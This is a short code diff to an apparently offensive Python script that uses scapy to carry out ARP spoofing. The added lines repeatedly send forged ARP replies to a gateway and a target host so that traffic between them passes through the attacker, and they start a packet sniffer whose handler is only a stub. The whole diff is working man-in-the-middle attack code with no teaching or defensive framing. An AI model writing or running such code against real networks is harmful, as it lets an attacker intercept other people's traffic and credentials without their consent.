@@ -76,3 +76,18 @@ def allow_ip_forwarding():
 def arp_spoofer(target_ip, target_mac, spoof_ip):
     pkt = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
     scapy.send(pkt, verbose=False)
+
+def send_spoof_packets():
+    while True:
+        arp_spoofer(gateway_info["ip"], gateway_info["mac"], node_to_spoof["ip"])
+        arp_spoofer(node_to_spoof["ip"], node_to_spoof["mac"], gateway_info["ip"])
+        time.sleep(3)
+        
+def packet_sniffer(interface):
+    packets = scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
+    
+def process_sniffed_packet(packet):
+    print("Writing packet to file. Press Ctrl+C to stop")
+    
+
+    
